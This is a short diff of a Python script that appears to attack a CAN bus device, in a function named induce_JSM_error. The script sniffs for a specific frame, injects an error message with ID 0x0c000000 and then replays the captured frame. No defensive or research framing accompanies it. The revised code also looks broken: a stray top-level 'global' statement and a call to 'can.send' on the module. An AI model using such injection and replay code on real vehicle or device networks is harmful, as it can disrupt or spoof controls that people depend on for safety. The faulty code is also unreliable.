@@ -15,23 +15,17 @@ def induce_JSM_error(cansocket):
 
 
 
-
+global msg1 
 msg = bus.recv()
-
+msg1 = msg
 if (msg.arbitration_id == 33554432):
     while 0==0:
         msg = bus.recv()
         print ("looking")
         if binascii.hexlify(msg.data)[0:2] == "9c":
             print ("got!")
-
-            errmsg = can.Message(arbitration_id=int("0c000000",16))
-            for i in range(0,3):
-                print ()
-                bus.send(errmsg)
-            sleep(3)
-            print ("asd")
-            time1 = time() + 2
-            while time1 > time():
-                sleep(0.005)
-                bus.send(msg)
+            msg1 = msg
+errmsg = can.Message(arbitration_id = int('0c000000',16))
+bus.send(errmsg)
+sleep(3)
+can.send(msg1)
